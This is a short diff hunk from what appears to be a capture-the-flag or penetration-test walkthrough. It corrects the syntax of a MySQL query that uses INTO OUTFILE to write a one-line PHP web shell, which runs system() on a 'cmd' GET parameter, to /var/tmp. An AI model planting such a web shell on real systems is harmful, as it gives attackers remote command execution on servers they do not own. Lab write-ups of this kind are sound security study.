@@ -48,7 +48,7 @@ Nothing! the database is just empty except for the mysql root user, which isn't 
 
  the command for this in copyable format:
 ```
-select "<? php system($_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"
+select "<?php system($_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"
 ```
 and we can now revisit the listing on port 8080 to see if it has saved:
 
